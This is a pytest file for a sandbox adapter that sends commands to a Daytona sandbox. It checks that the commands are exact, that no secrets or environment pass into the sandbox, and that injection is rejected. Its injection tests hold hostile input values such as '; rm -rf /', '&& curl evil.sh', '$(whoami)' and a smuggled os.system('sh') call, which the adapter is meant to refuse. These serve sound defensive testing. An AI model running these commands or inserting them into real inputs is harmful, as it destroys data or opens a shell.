"""Sandbox adapter tests. No Daytona SDK, no network, no container.

``DaytonaRunner`` takes an already-connected sandbox handle, so a fake handle
exercises every command it builds. What is worth asserting here is not that
Daytona works — H0 measured that — but that the commands we send are the ones
we mean, and that no secret can reach the sandbox.
"""

from __future__ import annotations

import ast
import shlex
import subprocess
import sys
from dataclasses import dataclass, field
from pathlib import Path

import pytest

from src.main.agentradar.adapters.sandbox import (
    DEFAULT_WORKDIR,
    DaytonaRunner,
    RawRun,
    SandboxRunner,
)
from src.main.agentradar.core.testreport import parse_pytest

SOURCE = (
    Path(__file__).resolve().parents[2]
    / "src"
    / "main"
    / "agentradar"
    / "adapters"
    / "sandbox.py"
)
FIXTURES = Path(__file__).resolve().parents[2] / "fixtures"

SELECTED = ["tests/test_server.py", "tests/test_make_intervals_request.py"]


# -- fakes -------------------------------------------------------------------


@dataclass
class _Response:
    exit_code: int = 0
    result: str = ""


@dataclass
class _Call:
    command: str
    kwargs: dict[str, object]


@dataclass
class _Process:
    calls: list[_Call] = field(default_factory=list)
    responses: list[_Response] = field(default_factory=list)

    def exec(self, command: str, **kwargs: object) -> _Response:
        self.calls.append(_Call(command, kwargs))
        if self.responses:
            return self.responses.pop(0)
        return _Response()


@dataclass
class _Fs:
    uploads: list[tuple[bytes, str]] = field(default_factory=list)

    def upload_file(self, src: bytes, dst: str) -> None:
        self.uploads.append((src, dst))


@dataclass
class FakeSandbox:
    """The slice of ``daytona.Sandbox`` the adapter actually touches."""

    process: _Process = field(default_factory=_Process)
    fs: _Fs = field(default_factory=_Fs)


class FakeSandboxRunner:
    """A ``SandboxRunner`` that returns canned output. PR11's gate tests need this."""

    def __init__(self, *, test_output: str = "", exit_code: int = 0) -> None:
        self.test_output = test_output
        self.exit_code = exit_code
        self.calls: list[tuple[str, object]] = []

    def run_tests(self, node_ids: list[str], *, timeout_s: int = 180) -> RawRun:
        self.calls.append(("run_tests", list(node_ids)))
        return RawRun(self.exit_code, self.test_output, "", 0.1)

    def set_package_version(self, package: str, version: str) -> RawRun:
        self.calls.append(("set_package_version", (package, version)))
        return RawRun(0, "", "", 0.1)

    def apply_patch(self, diff: str) -> RawRun:
        self.calls.append(("apply_patch", diff))
        return RawRun(0, "", "", 0.1)

    def import_check(self, symbol: str, package: str) -> RawRun:
        self.calls.append(("import_check", (symbol, package)))
        return RawRun(0, "", "", 0.1)


@pytest.fixture
def sandbox() -> FakeSandbox:
    return FakeSandbox()


@pytest.fixture
def runner(sandbox: FakeSandbox) -> DaytonaRunner:
    return DaytonaRunner(sandbox)


# -- the Protocol ------------------------------------------------------------


def test_both_runners_satisfy_the_protocol(runner: DaytonaRunner) -> None:
    assert isinstance(runner, SandboxRunner)
    assert isinstance(FakeSandboxRunner(), SandboxRunner)


def test_raw_run_reports_success() -> None:
    assert RawRun(0, "", "", 0.0).ok is True
    assert RawRun(2, "", "", 0.0).ok is False


# -- commands ----------------------------------------------------------------


def test_run_tests_targets_only_the_selected_tests(
    runner: DaytonaRunner, sandbox: FakeSandbox
) -> None:
    runner.run_tests(SELECTED)

    (call,) = sandbox.process.calls
    assert call.command == (
        "python -m pytest -v --durations=10 -rA "
        "tests/test_server.py tests/test_make_intervals_request.py"
    )
    assert call.kwargs["cwd"] == DEFAULT_WORKDIR
    assert call.kwargs["timeout"] == 180


def test_run_tests_without_ids_runs_the_whole_suite(
    runner: DaytonaRunner, sandbox: FakeSandbox
) -> None:
    runner.run_tests([])

    assert sandbox.process.calls[0].command == "python -m pytest -v --durations=10 -rA"


def test_run_tests_keeps_parametrised_node_ids(
    runner: DaytonaRunner, sandbox: FakeSandbox
) -> None:
    node_id = "tests/test_value.py::test_pace[MINS_KM-ValueUnits.MINS_KM]"
    runner.run_tests([node_id])

    assert node_id in sandbox.process.calls[0].command


def test_set_package_version_pins_exactly(
    runner: DaytonaRunner, sandbox: FakeSandbox
) -> None:
    runner.set_package_version("mcp", "2.1.1")

    assert sandbox.process.calls[0].command == (
        "pip install -q --break-system-packages mcp==2.1.1"
    )


def test_apply_patch_uploads_then_applies(
    runner: DaytonaRunner, sandbox: FakeSandbox
) -> None:
    diff = "--- a/src/x.py\n+++ b/src/x.py\n@@ -1 +1 @@\n-old\n+new\n"
    runner.apply_patch(diff)

    (payload, destination) = sandbox.fs.uploads[0]
    assert payload == diff.encode("utf-8")
    assert sandbox.process.calls[0].command == f"git apply --verbose {destination}"


def test_apply_patch_never_puts_diff_text_in_the_command(
    runner: DaytonaRunner, sandbox: FakeSandbox
) -> None:
    """A diff is attacker-shaped text; it must not be read as shell syntax."""
    runner.apply_patch("; rm -rf /\n")

    assert "rm -rf" not in sandbox.process.calls[0].command


def test_import_check_probes_the_symbol(
    runner: DaytonaRunner, sandbox: FakeSandbox
) -> None:
    runner.import_check("server.fastmcp", "mcp")

    command = sandbox.process.calls[0].command
    assert command.startswith("python -c ")
    assert "mcp.server.fastmcp" in command
    assert "importlib.import_module" in command


@pytest.mark.parametrize(
    ("symbol", "package", "expected"),
    [
        # A plain getattr walk fails this one: `pydantic.fields` is not an
        # attribute of `pydantic` until something imports it.
        ("fields.FieldInfo", "pydantic", 0),
        ("BaseModel", "pydantic", 0),
        ("NoSuchThing", "pydantic", 1),
        ("anything", "definitely_not_installed_pkg", 1),
    ],
)
def test_import_check_probe_actually_resolves(
    runner: DaytonaRunner,
    sandbox: FakeSandbox,
    symbol: str,
    package: str,
    expected: int,
) -> None:
    """Run the generated probe for real. Asserting the string is not enough.

    The probe runs `python` inside the sandbox; here it runs under this
    interpreter, which is the only way to prove its exit code means what the
    UNCOVERED verdict will claim it means.
    """
    runner.import_check(symbol, package)
    argv = shlex.split(sandbox.process.calls[0].command)
    argv[0] = sys.executable

    assert subprocess.run(argv, capture_output=True).returncode == expected


@pytest.mark.parametrize(
    ("package", "version"),
    [
        ("mcp; rm -rf /", "2.1.1"),
        ("mcp", "2.1.1 && curl evil.sh"),
        ("mcp", "$(whoami)"),
        ("", "2.1.1"),
    ],
)
def test_set_package_version_rejects_injection(
    runner: DaytonaRunner, sandbox: FakeSandbox, package: str, version: str
) -> None:
    with pytest.raises(ValueError):
        runner.set_package_version(package, version)

    assert sandbox.process.calls == []


@pytest.mark.parametrize("node_id", ["tests/x.py; rm -rf /", "$(whoami)", "a`b`"])
def test_run_tests_rejects_injection(
    runner: DaytonaRunner, sandbox: FakeSandbox, node_id: str
) -> None:
    with pytest.raises(ValueError):
        runner.run_tests([node_id])

    assert sandbox.process.calls == []


def test_import_check_rejects_non_identifiers(runner: DaytonaRunner) -> None:
    with pytest.raises(ValueError):
        runner.import_check('x"); import os; os.system("sh', "mcp")


# -- results -----------------------------------------------------------------


def test_exit_code_and_output_survive_the_seam(sandbox: FakeSandbox) -> None:
    sandbox.process.responses.append(_Response(exit_code=2, result="boom"))
    result = DaytonaRunner(sandbox).run_tests(SELECTED)

    assert result.exit_code == 2
    assert result.stdout == "boom"
    assert result.ok is False
    assert result.duration_s >= 0.0


def test_workdir_is_configurable(sandbox: FakeSandbox) -> None:
    DaytonaRunner(sandbox, workdir="/srv/repo").run_tests([])

    assert sandbox.process.calls[0].kwargs["cwd"] == "/srv/repo"


def test_apply_patch_without_a_filesystem_is_a_clear_error() -> None:
    class NoFs:
        process = _Process()

    with pytest.raises(RuntimeError, match="filesystem"):
        DaytonaRunner(NoFs()).apply_patch("diff")


# -- no secrets in the sandbox -----------------------------------------------


def test_no_call_ever_passes_env(runner: DaytonaRunner, sandbox: FakeSandbox) -> None:
    """Drive every method, then prove nothing carried an environment."""
    runner.set_package_version("mcp", "2.1.1")
    runner.run_tests(SELECTED)
    runner.apply_patch("diff")
    runner.import_check("server.fastmcp", "mcp")

    assert len(sandbox.process.calls) == 4
    assert all("env" not in call.kwargs for call in sandbox.process.calls)


def test_adapter_source_never_reads_the_environment() -> None:
    """Structural, not behavioural: the module has no path to a secret at all.

    ``connect`` takes the API key as an argument precisely so this holds.
    """
    tree = ast.parse(SOURCE.read_text(encoding="utf-8"))
    names = {node.id for node in ast.walk(tree) if isinstance(node, ast.Name)}
    attrs = {node.attr for node in ast.walk(tree) if isinstance(node, ast.Attribute)}
    imports = {
        alias.name
        for node in ast.walk(tree)
        if isinstance(node, ast.Import)
        for alias in node.names
    }

    assert "os" not in imports and "os" not in names
    assert {"environ", "getenv"}.isdisjoint(attrs)


def test_adapter_source_never_passes_env_to_exec() -> None:
    tree = ast.parse(SOURCE.read_text(encoding="utf-8"))
    keywords = {
        keyword.arg
        for node in ast.walk(tree)
        if isinstance(node, ast.Call)
        and isinstance(node.func, ast.Attribute)
        and node.func.attr == "exec"
        for keyword in node.keywords
    }

    assert "env" not in keywords


# -- the seam, end to end ----------------------------------------------------


def test_red_then_green_through_the_parser() -> None:
    """The demo cycle, with the runner faked and the parser real.

    Proves the two halves of this PR agree: what a runner hands back is what
    the parser turns into an honest verdict.
    """
    red = (FIXTURES / "pytest_output_red.txt").read_text(encoding="utf-8")
    green = (FIXTURES / "pytest_output_green.txt").read_text(encoding="utf-8")

    broken = FakeSandboxRunner(test_output=red, exit_code=2)
    broken.set_package_version("mcp", "2.1.1")
    after_bump = parse_pytest(
        broken.run_tests(SELECTED).stdout, "mcp", "2.1.1", "r_bump"
    )

    healthy = FakeSandboxRunner(test_output=green, exit_code=0)
    healthy.set_package_version("mcp", "1.29.1")
    after_revert = parse_pytest(
        healthy.run_tests(SELECTED).stdout, "mcp", "1.29.1", "r_revert"
    )

    assert after_bump.is_broken and not after_bump.is_green
    assert after_revert.is_green and not after_revert.is_broken
    assert broken.calls[0] == ("set_package_version", ("mcp", "2.1.1"))
    assert broken.calls[1] == ("run_tests", SELECTED)
